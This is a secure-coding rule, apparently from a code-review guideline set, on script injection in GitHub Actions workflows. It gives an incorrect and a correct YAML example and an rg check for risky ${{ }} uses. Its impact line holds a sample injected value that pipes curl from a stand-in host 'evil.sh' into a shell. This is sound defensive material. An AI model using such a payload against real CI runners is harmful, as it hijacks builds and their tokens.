---
id: gha-script-injection
title: Pass untrusted event fields to run steps through env, never inline ${{ }}
impact: CRITICAL
impactDescription: "a PR title or branch name like a\"; curl evil.sh | sh executes in the runner with the job's token"
roles: [implementer, reviewer, security]
check: "rg -n '\\$\\{\\{\\s*github\\.(event\\.(issue|pull_request|comment|review|head_commit|commits|pages)|head_ref)' .github/workflows"
tags: github-actions, security
---
Source: attacker-controlled event fields (`issue.title`, `pull_request.body`, `comment.body`, `head_ref`, commit messages). Sink: a `run:` script or `actions/github-script` `script:`. `${{ }}` is substituted into the script text before the shell parses it. Map the value to an env var and reference it quoted as a shell variable.

**Incorrect:**

```yaml
- run: echo "Title: ${{ github.event.pull_request.title }}"
```

**Correct:**

```yaml
- run: echo "Title: $PR_TITLE"
  env:
    PR_TITLE: ${{ github.event.pull_request.title }}
```
